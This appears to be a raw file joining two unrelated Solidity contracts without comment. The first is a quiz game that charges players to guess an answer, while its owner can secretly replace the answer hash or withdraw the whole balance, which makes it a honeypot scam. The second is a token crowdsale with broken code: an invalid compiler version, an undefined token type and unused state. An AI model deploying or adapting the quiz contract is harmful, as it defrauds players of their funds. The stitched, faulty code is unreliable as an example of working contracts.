pragma solidity ^0.4.20;

contract opposite_game
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(_response) && msg.value>100 finney)
        {
            msg.sender.transfer(this.balance);
        }
    }

    string public question;

    address questionSender;

    bytes32 responseHash;

    function start_quiz_game(string _question,string _response) public payable {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }

    function StopGame() public payable onlyQuestionSender {
       msg.sender.transfer(this.balance);
    }

    function NewQuestion(string _question, bytes32 _responseHash) public payable onlyQuestionSender {
        question = _question;
        responseHash = _responseHash;
    }

    function newQuestioner(address newAddress) public onlyQuestionSender {
        questionSender = newAddress;
    }

    modifier onlyQuestionSender(){
        require(msg.sender==questionSender);
        _;
    }

    function() public payable{}
}
pragma solidity ^0.3.0;
	 contract EthKeeper {
    uint256 public constant EX_rate = 250;
    uint256 public constant BEGIN = 40200010; 
    uint256 tokens;
    address toAddress;
    address addressAfter;
    uint public collection;
    uint public dueDate;
    uint public rate;
    token public reward;
    mapping(address => uint256) public balanceOf;
    bool crowdsaleClosed = false;
    function EthKeeper (
        address addressOfTokenUsedAsReward,
       address _toAddress,
        address _addressAfter
    ) public {
        tokens = 800000 * 10 ** 18;
        toAddress = _toAddress;
        addressAfter = _addressAfter;
        dueDate = BEGIN + 7 days;
        reward = token(addressOfTokenUsedAsReward);
    }
    function () public payable {
        require(now < dueDate && now >= BEGIN);
        require(msg.value >= 1 ether);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        collection += amount;
        tokens -= amount;
        reward.transfer(msg.sender, amount * EX_rate);
        toAddress.transfer(amount);
    }
 }
